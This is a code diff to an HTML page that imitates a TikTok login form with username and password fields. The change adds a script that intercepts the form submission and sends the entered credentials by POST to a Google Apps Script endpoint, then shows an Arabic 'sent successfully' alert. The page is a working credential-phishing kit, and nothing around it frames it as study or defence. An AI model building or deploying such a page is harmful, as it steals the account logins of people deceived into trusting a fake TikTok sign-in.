@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -51,11 +50,25 @@
   </style>
 </head>
 <body>
-  <form class="login-box" action="https://formspree.io/f/your-form-id" method="POST">
+  <form class="login-box" id="login-form">
     <h2>TikTok Login</h2>
     <input type="text" name="username" placeholder="Username" required />
     <input type="password" name="password" placeholder="Password" required />
     <button type="submit">Login</button>
   </form>
+
+  <script>
+    const form = document.getElementById("login-form");
+    form.addEventListener("submit", function(e) {
+      e.preventDefault();
+      const data = new FormData(form);
+      fetch("https://script.google.com/macros/s/AKfycbwA9rGTrW8T50SWPMzGfSKISErvaQ4k_lS6tLFJciagqRgVxjPniOr0KIFq8W4k9wmEwg/exec", {
+        method: "POST",
+        body: data
+      })
+      .then(response => alert("✅ تم الإرسال بنجاح!"))
+      .catch(error => alert("❌ فشل الإرسال: " + error));
+    });
+  </script>
 </body>
 </html>
